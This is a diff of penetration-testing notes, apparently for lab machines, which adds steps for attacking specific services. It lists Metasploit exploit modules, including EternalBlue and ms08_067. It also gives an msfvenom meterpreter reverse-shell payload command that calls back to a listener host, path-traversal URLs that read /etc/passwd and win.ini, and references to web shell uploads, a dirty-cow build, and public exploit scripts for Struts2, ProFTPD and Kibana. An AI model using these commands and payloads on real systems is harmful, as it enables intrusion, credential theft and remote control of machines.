@@ -9,12 +9,14 @@
 search struts2
 exploit(multi/http/struts2_content_type_ognl)
 ````
+### Microsoft-ds port 445
 - 445/tcp open  miscrosoft-ds
 - Run the nmap eternal scripts
 - USE:
 ````
 nmap --scripts=smb-vuln* $ip
 exploit(windows/smb/ms08_067_netapi)
+exploit(windows/smb/ms17_010_eternalblue)
 ````
 ### Wing FTP Server
 - 21/tcp open  wingftp
@@ -80,6 +82,7 @@ curl -s http://10.10.31.117:8000/kibana-log.txt | grep "root.txt"
 - Also can be used to get a shell in other situations
 - https://github.com/mpgn/CVE-2018-17246
 ### Sync Breeze Enterprise
+- Sync Breeze Enterprise v8.9.24
 - https://www.exploit-db.com/exploits/40456
 ````
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.16.6.1 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x26' -f python --smallest
@@ -132,10 +135,33 @@ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
 ````
 10.10.10.10/codiad/data/users.php
 ````
+- Directories found
+````
+/config.php
+/data
+/wordspace
+````
 - Upload web shell
 - Found SSH creds
+
+### Techblog (Wordpress Siteimport Exploit)
+- ![wp](https://user-images.githubusercontent.com/75596877/129896695-6c92634a-f5cc-4c47-96c3-a9fbc3dfcd1d.png)
+- LFI
+````
+http://10.16.1.3/wp-content/plugins/site-import/readme.txt
+http://10.16.1.3/wp-content/plugins/site-import/admin/page.php
+http://10.16.1.3/wp-content/plugins/site-import/admin/page.php?url=..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini
+http://10.16.1.3/wp-content/plugins/site-import/admin/page.php?url=../../../../../../../../../../etc/passwd
+wp-config.php file #has the login creds
+````
 ### Backupadmin
 - Priv Esc on box with Amanda running, view by
+-LFI Exploit
+````
+fileinfo.php?sha1=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+````
+- ![Screenshot 2021-08-18 081521](https://user-images.githubusercontent.com/75596877/129896411-01115472-b6f1-4219-b143-f55cdb3c2b7d.png)
+- ![Screenshot 2021-08-18 081521](https://user-images.githubusercontent.com/75596877/129896519-57dfb207-eaa6-4846-93de-c73a77d4e5ef.png)
 ````
 ls -al /usr/lib/amanda
 echo '#!/bin/sh
@@ -166,6 +192,16 @@ SELECT * FROM ost_form_entry;
 - Reverse Shells
 - Read the config files
 - Will run as root
+### init.d linux pe
+- ![Screenshot 2021-08-18 082244](https://user-images.githubusercontent.com/75596877/129897354-b6d4149f-4a29-4f65-9af7-8410d1a0d4a5.png)
+- ![Screenshot 2021-08-18 082313](https://user-images.githubusercontent.com/75596877/129897409-37fe5930-49c2-4e74-9859-4b0d3467a73f.png)
+- ![Screenshot 2021-08-18 082335](https://user-images.githubusercontent.com/75596877/129897438-9d485c16-473d-46cc-a6c5-17edbfd47063.png)
+### webserv
+- NAS4Free
+-Web shell via the file editor 
+### Pro FTPD 1.3.5
+- https://github.com/t0kx/exploit-CVE-2015-3306/blob/master/exploit.py
+
 
 
 
